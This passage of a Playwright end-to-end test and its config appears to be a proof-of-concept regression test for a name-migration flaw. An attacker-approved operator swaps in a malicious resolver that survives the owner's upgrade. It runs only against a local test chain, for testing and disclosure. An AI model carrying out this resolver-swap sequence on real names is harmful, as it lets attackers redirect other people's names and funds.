      abi: V1_BASE_REGISTRAR_ABI,
      data: tx.data,
    })
    if (decoded.functionName === 'approve') {
      const [operator, approvedTokenId] = decoded.args
      return approvedTokenId === tokenId &&
        isAddressEqual(operator, MIGRATION_HELPER)
        ? 'per-token'
        : null
    }
    if (decoded.functionName === 'setApprovalForAll') {
      const [operator, approved] = decoded.args
      return approved && isAddressEqual(operator, MIGRATION_HELPER)
        ? 'operator'
        : null
    }
  } catch {
    return null
  }
  return null
}

function decodeMigratedName(tx: CapturedTransaction, label: string) {
  if (!tx.data) return null

  try {
    const decodedOwnerExecution = decodeFunctionData({
      abi: HCA_OWNER_EXECUTION_ABI,
      data: tx.data,
    })
    if (decodedOwnerExecution.functionName !== 'executeByOwner') return null
    const [executions] = decodedOwnerExecution.args as [
      readonly OwnerExecution[],
    ]
    const migrationExecution = executions.find(({ target }) =>
      isAddressEqual(target, MIGRATION_HELPER),
    )
    if (!migrationExecution) return null

    const decodedMigration = decodeFunctionData({
      abi: MIGRATION_HELPER_ABI,
      data: migrationExecution.callData,
    })
    if (decodedMigration.functionName !== 'migrate') return null

    const [unwrappedNames] = decodedMigration.args as [
      readonly MigrationData[],
      readonly MigrationData[][],
      readonly MigrationData[][],
      readonly unknown[],
    ]
    return unwrappedNames.find((data) => data.label === label) ?? null
  } catch {
    return null
  }
}

async function authorizeAndInspectMigration(params: {
  readonly page: Page
  readonly wallet: Web3ProviderBackend
  readonly owner: Account
  readonly attacker: Account
  readonly label: string
  readonly node: Hex
  readonly tokenId: bigint
  readonly attackerResolver: Hex
  readonly legitimateResolver: Hex
  readonly isDone: () => boolean
}) {
  let handled = 0
  let approvalSeen = false
  let resolverRestored = false
  let operatorRevoked = false
  let finalMigrationData: MigrationData | null = null

  while (!params.isDone()) {
    if (
      params.wallet.getPendingRequestCount(Web3RequestKind.SendTransaction) < 1
    ) {
      await params.page.waitForTimeout(250)
      continue
    }

    const tx = await capturedTransactionAt(params.page, handled)
    handled += 1
    const migrationData = decodeMigratedName(tx, params.label)
    if (migrationData) {
      expect(approvalSeen).toBe(true)
      expect(resolverRestored).toBe(true)
      expect(operatorRevoked).toBe(true)
      expect((await readV1Resolver(params.node)).toLowerCase()).toBe(
        params.legitimateResolver.toLowerCase(),
      )
      await expect(
        readV1RegistryOperatorApproval(params.owner, params.attacker.address),
      ).resolves.toBe(false)
      expect(migrationData.resolver.toLowerCase()).toBe(
        params.attackerResolver.toLowerCase(),
      )
      finalMigrationData = migrationData
    }

    const approvalKind = decodeBaseRegistrarMigrationApprovalKind(
      tx,
      params.tokenId,
    )
    expect(approvalKind).not.toBe('operator')
    await params.wallet.authorize(Web3RequestKind.SendTransaction)

    if (approvalKind === 'per-token') {
      approvalSeen = true
      await setV1Resolver(
        params.attacker,
        params.node,
        params.legitimateResolver,
      )
      expect((await readV1Resolver(params.node)).toLowerCase()).toBe(
        params.legitimateResolver.toLowerCase(),
      )
      resolverRestored = true
      await revokeV1RegistryOperator(params.owner, params.attacker.address)
      operatorRevoked = true
    }
  }

  expect(approvalSeen).toBe(true)
  expect(resolverRestored).toBe(true)
  expect(operatorRevoked).toBe(true)
  expect(finalMigrationData).not.toBeNull()
  return finalMigrationData
}

test.describe('Manager migration resolver state', () => {
  test.describe.configure({ timeout: 300_000 })

  test('migrates a restored name with the previewed custom resolver', async ({
    migrationConnectedPage: page,
    wallet,
    accounts,
  }) => {
    await installSendTransactionCapture(page)

    const owner = privateKeyToAccount(accounts.getPrivateKey('user'))
    const attacker = privateKeyToAccount(accounts.getPrivateKey('user2'))
    const postMigrationAddress = getAddress(accounts.getAddress('user3'))
    const makeV1Name = createMakeV1Name({ userAccount: owner })
    const v1Name = await makeV1Name({ label: 'resolver-state' })
    const label = v1Name.replace('.eth', '')
    const node = namehash(v1Name)
    const tokenId = tokenIdFor(label)
    const attackerResolver = await deployAttackerResolver(label, attacker)

    await clearReusableMigrationApproval(owner)
    await expect(
      publicClient.readContract({
        address: V1_BASE_REGISTRAR,
        abi: V1_BASE_REGISTRAR_ABI,
        functionName: 'getApproved',
        args: [tokenId],
      }),
    ).resolves.toBe(zeroAddress)
    await expect(
      publicClient.readContract({
        address: V1_BASE_REGISTRAR,
        abi: V1_BASE_REGISTRAR_ABI,
        functionName: 'isApprovedForAll',
        args: [owner.address, MIGRATION_HELPER],
      }),
    ).resolves.toBe(false)

    await setV1Resolver(owner, node, V1_PUBLIC_RESOLVER)
    const legitimateV1Resolver = await readV1Resolver(node)
    expect(legitimateV1Resolver.toLowerCase()).toBe(
      V1_PUBLIC_RESOLVER.toLowerCase(),
    )

    await approveV1RegistryOperator(owner, attacker.address)
    await setAttackerRecord(attackerResolver, attacker, node, attacker.address)
    expect(
      (await readResolverAddress(attackerResolver, node)).toLowerCase(),
    ).toBe(attacker.address.toLowerCase())

    await setV1Resolver(attacker, node, attackerResolver)
    const v1Controller = await publicClient.readContract({
      address: V1_ENS_REGISTRY,
      abi: V1_ENS_REGISTRY_ABI,
      functionName: 'owner',
      args: [node],
    })
    expect(isAddressEqual(v1Controller, owner.address)).toBe(true)
    expect((await readV1Resolver(node)).toLowerCase()).toBe(
      attackerResolver.toLowerCase(),
    )

    await mockV1Subgraph(
      page,
      [
        {
          name: v1Name,
          ownerAddress: owner.address,
          records: {
            addresses: [
              { coinType: Number(COIN_TYPE_ETH), value: attacker.address },
            ],
          },
          resolver: attackerResolver,
        },
      ],
      { includeRemoteDomains: false },
    )

    await page.goto(`${MANAGER_APP_URL}/migration`, {
      waitUntil: 'domcontentloaded',
    })
    const confirmButton = page.getByRole('button', { name: 'Upgrade 1 name' })
    await expect(confirmButton).toBeEnabled({ timeout: 60_000 })

    const successIndicator = page.getByRole('heading', {
      name: 'Your name has been upgraded!',
    })
    let migrationFinished = false
    const inspectedMigration = await Promise.all([
      (async () => {
        try {
          await confirmButton.click()
          await successIndicator.waitFor({ state: 'visible', timeout: 90_000 })
        } finally {
          migrationFinished = true
        }
      })(),
      authorizeAndInspectMigration({
        page,
        wallet,
        owner,
        attacker,
        label,
        node,
        tokenId,
        attackerResolver,
        legitimateResolver: legitimateV1Resolver,
        isDone: () => migrationFinished,
      }),
    ]).then(([, migrationData]) => migrationData)
    if (!inspectedMigration) {
      throw new Error('Final migration calldata was not captured')
    }

    expect(inspectedMigration.owner.toLowerCase()).toBe(
      owner.address.toLowerCase(),
    )
    expect(inspectedMigration.resolver.toLowerCase()).toBe(
      attackerResolver.toLowerCase(),
    )

    await assertV2Registered(label)
    await assertV2Resolver(label, attackerResolver)
    expect(
      (await readResolverAddress(attackerResolver, node)).toLowerCase(),
    ).toBe(attacker.address.toLowerCase())

    await setAttackerRecord(
      attackerResolver,
      attacker,
      node,
      postMigrationAddress,
    )
    expect(
      (await readResolverAddress(attackerResolver, node)).toLowerCase(),
    ).toBe(postMigrationAddress.toLowerCase())
  })
})
```

```ts
// e2e/projects/manager/playwright.migration-poc.config.ts

import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { defineConfig } from '@playwright/test'
import { baseConfig } from '../../playwright.config.base.js'

const configDirectory = path.dirname(fileURLToPath(import.meta.url))
const managerDirectory = path.resolve(configDirectory, '../../../apps/manager')
const managerUrl = process.env.MANAGER_APP_URL ?? 'http://localhost:3000'

/**
 * Runs the focused migration regression coverage. The standard Manager E2E
 * config excludes migration specs while that broader suite remains disabled.
 */
export default defineConfig({
  ...baseConfig,
  timeout: 300_000,
  testDir: './tests',
  use: {
    ...baseConfig.use,
    baseURL: managerUrl,
  },
  // The migration flow needs the existing local Anvil/Mockestrator stack, but
  // Playwright can safely manage the Manager development server itself.
  webServer: process.env.MANAGER_APP_URL
    ? undefined
    : {
        command: 'pnpm dev',
        cwd: managerDirectory,
        url: managerUrl,
        timeout: 120_000,
        reuseExistingServer: !process.env.CI,
        env: {
          ...process.env,
          VITE_SEPOLIA_RPC_URL: 'http://127.0.0.1:8545',
          VITE_RHINESTONE_ENDPOINT_URL: '/orchestrator',
          VITE_RHINESTONE_CUSTOM_RPC_URLS:
            '{"11155111":"http://127.0.0.1:8545"}',
          // Lets the existing E2E client-side PostHog override initialize
          // without making a request to an external analytics service.
          VITE_PUBLIC_POSTHOG_KEY: 'e2e-local',
          VITE_PUBLIC_POSTHOG_HOST: 'http://127.0.0.1:3000',
          // Accounts are funded directly by the local Anvil fixture; no API
          // worker/faucet runs as part of this focused stack.
          VITE_E2E_FORCE_MIGRATION: 'true',
        },
      },
  projects: [
    {
      name: 'manager-migration-poc',
      testMatch:
        /(?:migration-stale-controller|migration-resolver-pointer)\.spec\.ts$/,
    },
  ],
})
```
